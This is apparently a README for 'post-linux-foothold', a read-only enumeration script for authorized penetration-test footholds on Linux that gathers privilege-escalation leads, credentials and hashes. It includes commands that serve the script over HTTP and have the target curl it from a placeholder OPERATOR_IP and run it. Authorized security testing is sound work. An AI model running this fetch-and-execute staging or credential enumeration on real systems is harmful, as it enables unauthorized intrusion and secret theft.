# post-linux-foothold

A read-only Linux enumeration collector for an authorized shell foothold. It
does not attempt exploitation, change system configuration, or invoke privilege
wrappers. Each section is bounded and failures do not stop later collection.

## Run on the target

```bash
chmod +x post-linux-foothold.sh
./post-linux-foothold.sh
```

Use quick mode on a fragile shell, or deep mode when filesystem traversal is
acceptable:

```bash
./post-linux-foothold.sh --quick
./post-linux-foothold.sh --deep -o /tmp/foothold-report
```

The script prints the final report directory. Start with `summary.md`; it ranks
high-confidence leads and recommends a next validation step with references to
the relevant numbered evidence files. Nonstandard SUID/SGID executables under
application and user-controlled locations receive automatic static triage in
`18-custom-code.txt`. The machine-readable ranking is also in `findings.tsv`.
Deep scans exclude their own report directory. Output permissions default to
the executing user because reports can contain credentials, hashes,
environment variables and private configuration.

## Serve it from the operator machine

```bash
python3 -m http.server 8000 --directory /home/zendeni/tools/post-linux-foothold
```

Then fetch it from the target using the operator VPN address:

```bash
curl http://OPERATOR_IP:8000/post-linux-foothold.sh -o /tmp/post-linux-foothold.sh
chmod +x /tmp/post-linux-foothold.sh
/tmp/post-linux-foothold.sh
```
